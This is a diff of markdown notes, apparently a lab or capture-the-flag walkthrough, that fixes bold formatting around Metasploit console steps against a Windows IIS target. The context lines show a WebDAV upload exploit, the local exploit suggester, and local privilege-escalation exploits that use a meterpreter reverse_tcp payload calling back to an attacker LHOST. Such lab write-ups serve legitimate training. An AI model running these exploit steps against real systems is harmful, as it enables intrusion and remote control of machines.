@@ -4,7 +4,7 @@
 msf exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
 RHOST => 10.10.10.15
 ```
-**Always set LHOST
+**Always set LHOST**
 
 ```shell 
 msf exploit(windows/iis/iis_webdav_upload_asp) > set LHOST 10.10.14.11
@@ -39,7 +39,7 @@ meterpreter > background
 [*] Backgrounding session 1...
 *****
 ```
-**Ask Ask Suggester
+**Ask Ask Suggester**
 ```shell
 msf post(windows/manage/migrate) > use post/multi/recon/local_exploit_suggester 
 msf post(multi/recon/local_exploit_suggester) > set session 1
@@ -47,7 +47,7 @@ session => 1
 msf post(multi/recon/local_exploit_suggester) > exploit 
 ```
 *****
-**Take one exploit
+**Take one exploit**
 ```shell
 msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ppr_flatten_rec 
 msf exploit(windows/local/ppr_flatten_rec) > set session 1
@@ -58,7 +58,7 @@ lhost => 10.10.14.11
 msf exploit(windows/local/ppr_flatten_rec) > set WAIT 20
 WAIT => 20
 ```
-**Remember Set LHOST on reverseTCP:
+**Remember Set LHOST on reverseTCP:**
 ```shell
 msf exploit(windows/local/ppr_flatten_rec) > set PAYLOAD windows/meterpreter/reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_tcp
@@ -79,7 +79,7 @@ Listing: c:\
 meterpreter > cd "Documents and Settings"
 *****
 ```
-**Other exploit:
+**Other exploit:**
 ```shell 
 msf exploit(windows/local/ppr_flatten_rec) > use exploit/windows/local/ms14_070_tcpip_ioctl 
 msf exploit(windows/local/ms14_070_tcpip_ioctl) > set session 2
